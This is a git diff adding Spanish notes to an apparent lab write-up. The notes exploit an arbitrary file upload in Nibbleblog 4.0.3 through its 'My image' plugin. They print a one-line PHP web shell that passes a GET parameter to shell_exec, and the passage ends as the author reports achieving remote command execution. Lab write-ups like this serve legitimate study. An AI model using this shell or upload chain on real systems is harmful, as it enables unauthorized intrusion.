@@ -46,4 +46,25 @@ Ahora podemos usar [[SEARCHSPLOIT]] en busqueda de vulnerabilidades en este *CMS
 searchsploit nibbleblog
 ```
 
-Encontramos un *Arbitrary File Upload* en la version *4.0.3* la cual es la misma que la web publicada así que procederemos a su explotación
+Encontramos un *Arbitrary File Upload* en la versión *4.0.3* la cual es la misma que la web publicada así que procederemos a su explotación
+```shell
+searchsploit -x php/remote/38489.rb 
+```
+
+En este script se modifica en la ruta de `plugins` uno llamado `My image`, al darle a la opcion de configurar se nos permite la subida de un archivo.
+En el directorio descargas crearemos un archivo `.txt` de prueba para corroborar donde se sube el archivo y validar si se sube en la ruta anteriormente descubierta `/plugins/my_image`.
+Pero nos e carga en esa ruta si no que se carga en `/nibbleblog/content/private/plugins/my_image/`.
+![[Pasted image 20260909212753.png]]
+
+Ahora vamos a intentar subir un script en `.php` que nos deje ejecutar una orden a nivel de sistema y ver si se interpretan los comandos.
+Crearemos un archivo `.php`
+```php
+<?php
+ echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+```
+
+Lo subiremos y accederemos a la ruta
+![[Pasted image 20260909213058.png]]
+
+Hemos obtenido *RCE (Remote Command Ejecution)* ya que hemos conseguido obtener la direcc
